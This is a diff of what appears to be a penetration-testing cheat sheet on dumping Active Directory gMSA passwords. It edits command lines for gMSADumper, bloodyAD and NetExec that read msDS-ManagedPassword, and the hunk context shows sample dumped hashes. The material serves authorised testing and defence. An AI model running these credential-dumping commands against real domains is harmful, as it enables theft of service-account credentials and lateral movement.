@@ -12,7 +12,7 @@ tags: ["Credential Dumping", "ReadGMSApassword", "Gmsadumper", "Active Directory
 {{< tabcontent set1 tab1 >}}
 
 ```console
-python3 gMSADumper.py -u <USER> -p '<PASSWORD>' -l <DC> -d <DOMAIN>
+python3 gMSADumper.py -u '<USER>' -p '<PASSWORD>' -l <DC> -d <DOMAIN>
 ```
 
 ```console {class="sample-code"}
@@ -31,7 +31,7 @@ svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3
 {{< tabcontent set1 tab2 >}}
 
 ```console
-python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
+sudo ntpdate -s <DC_IP> && bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword
 ```
 
 ```console {class="sample-code"}
@@ -48,7 +48,7 @@ msDS-ManagedPassword.B64ENCODED: wcVVmCKWYOZszus92zsZDFqtPFYu960EdHowLnWB5vChR4R
 {{< tabcontent set1 tab3 >}}
 
 ```console
-nxc ldap -u <USER> -p '<PASSWORD>' -d <DOMAIN> <DC> --gmsa
+nxc ldap -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> <DC> --gmsa
 ```
 
 ```console {class="sample-code"}
